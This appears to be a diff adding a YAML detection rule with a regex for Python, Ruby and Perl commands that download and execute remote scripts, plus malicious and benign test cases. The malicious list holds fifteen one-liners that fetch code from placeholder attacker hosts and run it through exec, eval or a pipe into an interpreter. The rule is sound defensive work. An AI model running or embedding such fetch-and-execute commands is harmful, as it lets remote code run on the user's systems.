@@ -1,0 +1,57 @@
+name: high-26-python-ruby-perl
+severity: high
+description: >
+  Detects scripting languages downloading and executing remote scripts. Cross-platform attack vector.
+
+pattern: |
+  (?i)(python|ruby|perl).*(urllib|requests|eval|exec|Net::HTTP|LWP).*(http|ftp)s?://|(curl|wget).*(http|ftp)s?://.*\|\s*(python|ruby|perl)
+
+malicious:
+  - 'python -c "import urllib; exec(urllib.urlopen(''http://evil.com/p.py'').read())"'
+  - 'ruby -e "require ''net/http''; eval(Net::HTTP.get(URI(''http://malware.com/s.rb'')))"'
+  - 'perl -e "use LWP::Simple; eval(get(''http://evil.com/p.pl''))"'
+  - 'python3 -c "import requests; exec(requests.get(''https://attacker.com/backdoor.py'').text)"'
+  - 'python -c "exec(__import__(''urllib'').urlopen(''http://evil.com/mal.py'').read())"'
+  - 'ruby -e "require ''open-uri''; eval(URI.open(''http://bad.com/dropper.rb'').read)"'
+  - 'perl -MLWP::Simple -e "eval(get(''http://evil.com/payload.pl''))"'
+  - 'python3 -c "import urllib.request; exec(urllib.request.urlopen(''http://malware.com/clickfix.py'').read())"'
+  - 'ruby -ropen-uri -e "eval(URI.open(''https://attacker.com/implant.rb'').read)"'
+  - "curl http://evil.com/script.py | python"
+  - "wget -qO- http://malware.com/payload.rb | ruby"
+  - "curl -s https://evil.com/backdoor.pl | perl"
+  - 'python2 -c "import urllib2; exec(urllib2.urlopen(''http://evil.com/mal.py'').read())"'
+  - 'python -c "exec(__import__(''requests'').get(''https://attacker.com/stage2.py'').text)"'
+  - "curl http://evil.com/dropper.py | python3"
+
+benign:
+  - "python script.py"
+  - "ruby app.rb"
+  - "perl test.pl"
+  - "python3 -m http.server"
+  - "ruby -v"
+  - "perl -e 'print \"Hello\\n\"'"
+  - 'python -c ''print("test")'''
+  - "python3 manage.py runserver"
+  - 'ruby -rjson -e ''puts JSON.parse(File.read("data.json"))'''
+  - "perl -ne 'print if /pattern/' file.txt"
+  - "python -m pip install package"
+  - "ruby bundle install"
+  - "perl -i -pe 's/old/new/' file.txt"
+  - "python3 setup.py install"
+  - "ruby rake test"
+  - "perl -MData::Dumper -e 'print Dumper(\\%hash)'"
+  - "python -c 'import sys; print(sys.version)'"
+  - "python3 app.py --port 8080"
+  - "ruby -e 'puts RUBY_VERSION'"
+  - "perl -MCPAN -e 'install Module::Name'"
+  - "python manage.py migrate"
+  - "ruby rails server"
+  - "perl -lane 'print $F[0]' data.txt"
+  - "python3 -m venv env"
+  - "ruby gem install rails"
+  - "perl Makefile.PL"
+  - "python -m unittest discover"
+  - "ruby rspec spec/"
+  - "perl -w script.pl"
+  - "python3 -m pytest"
+  - "python -c 'from datetime import datetime; print(datetime.now())'"
